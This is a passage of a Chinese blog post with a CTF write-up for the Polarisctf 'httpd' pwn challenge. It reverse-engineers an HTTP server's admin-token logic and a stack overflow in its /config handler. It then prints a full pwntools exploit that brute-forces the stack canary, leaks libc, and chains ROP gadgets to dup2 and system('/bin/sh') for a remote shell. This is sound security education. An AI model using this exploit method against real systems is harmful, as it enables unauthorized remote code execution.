+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775133282111-6daa11e0-404e-4821-8dff-310f569df26a.png" srcset="/img/loading.gif" lazyload></p>
+<p>这才是正经题</p>
+<p>˃̣̣̥᷄⌓˂̣̣̥᷅</p>
+<h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774788539777-b40a0a98-63c7-49e3-a011-93d53490fc18.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774788695400-6f6aaf5d-ceed-48fd-9195-43779d0cb6f8.png" srcset="/img/loading.gif" lazyload></p>
+<p>看着像服务器的题</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775004998968-a441c5c5-09f4-4a19-befa-7dfab582fa64.png" srcset="/img/loading.gif" lazyload></p>
+<p>9999</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005065394-da659373-3108-4ff6-bf37-3c834db64c30.png" srcset="/img/loading.gif" lazyload></p>
+<p>甚至还会显示sig，也是提示fork爆canary了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775006041012-817a30f7-2c27-4581-84bf-1f6beda24ad4.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005404430-5793235a-492b-4b8e-9c95-0c1a3e828602.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005566612-ed787f89-d6fe-4108-8866-8f661c437754.png" srcset="/img/loading.gif" lazyload></p>
+<p>子父进程共享mmap的内存</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005648968-8ab0d834-97aa-498b-8edd-9a197f8af60e.png" srcset="/img/loading.gif" lazyload></p>
+<p>应该就是要搞这个函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005707164-63b42924-d45e-4857-9b11-809de2242dee.png" srcset="/img/loading.gif" lazyload></p>
+<p>malloc了一块s</p>
+<p>get和post请求</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005774332-d453bf76-b6dc-47a4-afd8-5378423478a5.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看这个</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005944541-d19fd859-fbec-489a-9099-3dd7c4ec8770.png" srcset="/img/loading.gif" lazyload></p>
+<p>http协议解析器</p>
+<p>s1大概长这样</p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">偏移 (Offset)</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">字段名</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">长度&#x2F;类型</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">说明</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Method&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">16 bytes</font></td>
+<td><font style="color:rgb(31, 31, 31);">如 “GET” 或 “POST”</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+16&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Path&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">256 bytes</font></td>
+<td><font style="color:rgb(31, 31, 31);">请求路径</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+272&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Proto&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">16 bytes</font></td>
+<td><font style="color:rgb(31, 31, 31);">协议版本 (如 “HTTP&#x2F;1.1”)</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+288&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Header_Count&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">4 bytes (int)</font></td>
+<td><font style="color:rgb(31, 31, 31);">当前解析到的 Header 数量</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+292&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Headers&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">32 * 320 bytes</font></td>
+<td><font style="color:rgb(31, 31, 31);">Header 数组 (每个 Key 64B, Value 256B)</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+10532&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Token_Key&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">64 bytes</font></td>
+<td><font style="color:rgb(31, 31, 31);">Cookie 中的 token 键名</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+10596&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Token_Value&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">256 bytes</font></td>
+<td><font style="color:rgb(31, 31, 31);">Cookie 中的 token 值</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+10856&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Body_Ptr&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">8 bytes (QWORD)</font></td>
+<td><strong><font style="color:rgb(31, 31, 31);">指向 POST Body 的堆指针</font></strong></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+10864&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;Content_Length&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">8 bytes (QWORD)</font></td>
+<td><font style="color:rgb(31, 31, 31);">解析出的正文长度</font></td>
+</tr>
+</tbody></table>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">read(fd, buf, <span class="hljs-number">0xFFFu</span>LL);<br><br>haystack_1 = <span class="hljs-built_in">strstr</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)buf, <span class="hljs-string">&quot;\r\n\r\n&quot;</span>); <span class="hljs-comment">// 寻找 Header 结束标志</span><br>v7 = <span class="hljs-built_in">strstr</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)buf, <span class="hljs-string">&quot;\r\n&quot;</span>);            <span class="hljs-comment">// 寻找第一行结束</span><br>*v7 = <span class="hljs-number">0</span>;                                           <span class="hljs-comment">// 截断第一行，方便 sscanf 解析</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775007246157-e6eccc95-a779-4b3d-8ed0-d5de9beca695.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看get</p>
+<p>多少有点煎熬了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775030653292-3d1f3ab3-ccb9-4dbc-9567-db59907bd389.jpeg" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775032909653-0ef45a32-9039-4cb0-967f-ec3d9352dfe0.png" srcset="/img/loading.gif" lazyload></p>
+<p>提取url路径</p>
+<p>这LABEL_17怎么这么长•᷄ࡇ•᷅</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775042784953-a43ae1a3-a98f-45cd-8bdb-f5e2219567c9.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775042795166-0f736766-64fd-43d8-b074-f529ef37d362.png" srcset="/img/loading.gif" lazyload></p>
+<p>检验token</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775042940703-2a58e121-2a00-4c22-b5d6-71040cdf69d4.png" srcset="/img/loading.gif" lazyload></p>
+<p>char s[256]&#x3D;0</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775042985240-ee4056ef-6669-4908-ba29-de21cdf0953b.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775043024676-1d176863-0377-41d4-ae84-defef038029f.png" srcset="/img/loading.gif" lazyload></p>
+<p>检查admin token，if not goto start</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775043521893-ca225047-b64d-4f94-8294-5e4f93d9ff3c.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个if没有检验，直接进入</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775043857268-45603227-449e-4299-938a-f91070fcfc22.png" srcset="/img/loading.gif" lazyload></p>
+<p>生成admin token</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775044061984-e2678b91-2cbc-4362-8a06-3b780975772e.png" srcset="/img/loading.gif" lazyload></p>
+<p>if a3(s)，send admin token</p>
+<p>进入&#x2F;getCookie 时不为0</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775044338911-c1843632-6770-43f2-b735-35c815d249bd.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样就得到了admin token</p>
+<p>再看看post</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775044527401-289d0e7c-e08e-45b1-b228-bd626d14ee20.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个是校验正常登入</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775047788823-a00fd4bf-e208-42f2-b3f0-398f73a54763.png" srcset="/img/loading.gif" lazyload></p>
+<p>检查admin token 后可以resetpasswd</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775047760044-16842b1d-0264-48fc-91a9-450b3acf1b90.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775047842080-e1d23bb8-e409-46a0-898c-fa174887ac22.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过token检验后用4035a0函数处理</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775048500072-50dcee28-3da3-4a55-bf6d-4c61390a9135.png" srcset="/img/loading.gif" lazyload></p>
+<p>canary is here</p>
+<p><font style="color:#DF2A3F;">dest_3[5]&#x3D;rbp-0x40+40bytes&#x3D;rbp-0x18</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775049030976-2209ea70-e484-4d03-ac02-6c27081a0117.png" srcset="/img/loading.gif" lazyload></p>
+<p>寻找 “gateway” 对应的结构体，把指针赋给 a3  </p>
+<p>dest_3 只有56bytes，但memcpy的字节是post上去的payload决定</p>
+<p>显然可以打rop</p>
+<p><font style="color:rgb(38, 38, 38);">get,host请求+canary-fork泄露+stack-pivot+reset register+ret2libc</font></p>
+<p><font style="color:rgb(38, 38, 38);">canary-leak</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775049569086-c4d65de1-3cdd-43b2-a990-e3e22829c5f0.png" srcset="/img/loading.gif" lazyload></p>
+<p>leak read_real_addr</p>
+<p>这里要add rax，防止write不出来，write的值return 进rax里</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050164588-14bd2b2d-fa92-4e9f-8cbc-7126e99b5e77.png" srcset="/img/loading.gif" lazyload></p>
+<p>没PIE真是件美事啊</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775049964267-5a4a6b83-65f2-4698-896a-bb0fae839430.png" srcset="/img/loading.gif" lazyload></p>
+<p>就你了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050423864-57420bde-322e-4e1b-9747-a0eebf0ad99d.png" srcset="/img/loading.gif" lazyload></p>
+<p>就你了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050438063-77c6a44f-fa64-48e3-8195-3e15a9c6b718.jpeg" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050608403-b9bff0d8-9aa3-4184-8a8f-6a14f6e7906f.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050623417-e3c46aa2-c61f-4aa1-8e74-9f8666e1a1a1.png" srcset="/img/loading.gif" lazyload></p>
+<p>打ret2libc</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050796165-c31dfc41-00fd-4517-945c-bc9286a46b09.png" srcset="/img/loading.gif" lazyload></p>
+<p>加个ret</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050843778-b67cff1b-2407-4398-90c1-b47a28fedc16.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050862599-aa246268-0d82-4e70-95f9-0abf61f2e71f.png" srcset="/img/loading.gif" lazyload>这里没反应</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050887979-9199d370-26c2-4132-a434-160fc34af100.png" srcset="/img/loading.gif" lazyload></p>
+<p>shell怎么跑这里了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775051018662-dcf01b50-65eb-498a-a478-ce8c165a171a.jpeg" srcset="/img/loading.gif" lazyload></p>
+<p>我查一查</p>
+<p>ok了，是 Shell 默认的<strong>标准输入 (stdin, fd&#x3D;0)</strong> 和 **标准输出 (stdout, fd&#x3D;1)**问题</p>
+<p>Socket和弹出来的 Shell 是<strong>互相隔离的</strong></p>
+<p>可以用rop.dup2( 4, 0)重定向stdin&#x2F;out</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775051311568-a5bf36bb-c9a6-4bcf-8aed-093a5e1524ea.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775051371636-7b2d058b-6a90-4718-bc1f-3ca411e1da69.png" srcset="/img/loading.gif" lazyload></p>
+<p>试试</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775132603352-df1c1fdb-355d-48e0-81a0-c46f1533d7bf.png" srcset="/img/loading.gif" lazyload></p>
+<p>成了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br><br>HOST, PORT = <span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="hljs-number">14271</span><br>exe = <span class="hljs-string">&#x27;/home/shark/Desktop/ctf/temp/code/Polarisctf/pwn-httpd/attachments/httpd&#x27;</span><br>elf = ELF(exe, checksec=False)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>, checksec=False)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = elf<br><br>def send_post(token, payload, get_shell=False):<br>    r = remote(HOST, PORT, level=<span class="hljs-string">&#x27;error&#x27;</span>)<br>    <br>    raw_url_encoded = b<span class="hljs-string">&quot;&quot;</span>.join(b<span class="hljs-string">&quot;%%%02X&quot;</span> % b <span class="hljs-keyword">for</span> b in payload)<br>    <br>    body_data = b<span class="hljs-string">&quot;route_name=1&amp;ip=1&amp;subnet_mask=1&amp;gateway=&quot;</span> + raw_url_encoded<br>    conn_type = <span class="hljs-string">&quot;keep-alive&quot;</span> <span class="hljs-keyword">if</span> get_shell <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;close&quot;</span><br>    <br>    header = (<br>        f<span class="hljs-string">&quot;POST /config HTTP/1.1\r\n&quot;</span><br>        f<span class="hljs-string">&quot;Host: &#123;HOST&#125;:&#123;PORT&#125;\r\n&quot;</span><br>        f<span class="hljs-string">&quot;Cookie: &#123;token&#125;\r\n&quot;</span><br>        f<span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br>        f<span class="hljs-string">&quot;Content-Length: &#123;len(body_data)&#125;\r\n&quot;</span><br>        f<span class="hljs-string">&quot;Connection: &#123;conn_type&#125;\r\n\r\n&quot;</span><br>    ).encode()<br>    <br>    r.send(header + body_data)<br>    <br>    <span class="hljs-keyword">if</span> get_shell:<br>        <span class="hljs-keyword">return</span> r<br>    try:<br>        <span class="hljs-keyword">return</span> r.recvall(timeout=<span class="hljs-number">1</span>)<br>    except:<br>        <span class="hljs-keyword">return</span> b<span class="hljs-string">&quot;&quot;</span><br> <br><br>r = remote(HOST, PORT, level=<span class="hljs-string">&#x27;error&#x27;</span>)<br>r.send(b<span class="hljs-string">&quot;GET /getCookie HTTP/1.1\r\n\r\n&quot;</span>)<br>token = b<span class="hljs-string">&quot;token=&quot;</span> + r.recvall(timeout=<span class="hljs-number">1</span>).split(b<span class="hljs-string">&quot;token=&quot;</span>)[<span class="hljs-number">1</span>].split(b<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">0</span>]<br>token_str = token.decode()<br>print(f<span class="hljs-string">&quot;Admin Token: &#123;token_str&#125;&quot;</span>)<br><br>print(<span class="hljs-string">&quot;Leaking Canary...&quot;</span>)<br>canary = b<span class="hljs-string">&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> b in range(<span class="hljs-number">256</span>):<br>        payload = b<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">40</span> + canary + bytes([b])<br>        <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;500&quot;</span> not in send_post(token_str, payload):<br>            canary += bytes([b])<br>            print(f<span class="hljs-string">&quot;Canary found: &#123;canary.hex()&#125;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>print(f<span class="hljs-string">&quot;Final Canary: &#123;canary.hex()&#125;&quot;</span>)<br><br><br>got_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.got.plt&#x27;</span>).header.sh_addr<br>ptr_to_got = next(elf.search(p64(got_plt))) <br>pause()<br>add_eax_b8 = <span class="hljs-number">0x403009</span>     <br>magic_write_rdx = <span class="hljs-number">0x401994</span> <br><br>leak_pl = b<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">40</span> + canary + b<span class="hljs-string">&quot;c&quot;</span> * <span class="hljs-number">0x10</span> <br>leak_pl += p64(ptr_to_got + <span class="hljs-number">8</span>) <br>leak_pl += p64(add_eax_b8) * <span class="hljs-number">2</span> <br>leak_pl += p64(magic_write_rdx)<br><br>resp = send_post(token_str, leak_pl)<br>offset = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>] - got_plt<br>libc.address = u64(resp[offset : offset+<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>print(f<span class="hljs-string">&quot;Libc Base: &#123;hex(libc.address)&#125;&quot;</span>)<br>pause()<br>rop = ROP(libc)<br>rop.dup2(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>) <br>rop.dup2(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>)<br>rop.raw(next(elf.search(<span class="hljs-keyword">asm</span>(<span class="hljs-string">&#x27;ret&#x27;</span>)))) # 栈对齐<br>rop.system(next(libc.search(b<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)))<br><br>payload = b<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">40</span> + canary + b<span class="hljs-string">&quot;c&quot;</span> * <span class="hljs-number">0x10</span> + b<span class="hljs-string">&quot;b&quot;</span> * <span class="hljs-number">8</span> + rop.chain()<br><br>print(<span class="hljs-string">&quot;finaly •᷄ࡇ•᷅&quot;</span>)<br>r = send_post(token_str, payload, get_shell=True)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>ok了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775132965462-972d67ad-4ba9-4494-8c86-da699d943566.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是爆的是真的慢</p>
+<p>运气挺好，附件是没libc的，看来远程的libc.so.6跟我的一样，不过就算不一样也能用libsearch</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B-Writeup/" class="category-chain-item">polarisctf招新赛 Writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Polarisctf招新赛</div>
+      <div>https://ghostshark-pro.github.io/2026/04/23/Polarisctf招新赛/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>shark</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted</div>
+          <div>2026年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>License</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/23/pwn.college-pro%20sec-_Dynamic%20Allocator%20Misuse/" title="pwn.college-pro sec-_Dynamic Allocator Misuse">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwn.college-pro sec-_Dynamic Allocator Misuse</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/23/NewStar2024/" title="NewStar2024">
+                        <span class="hidden-mobile">NewStar2024</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>TOC</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Grep</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
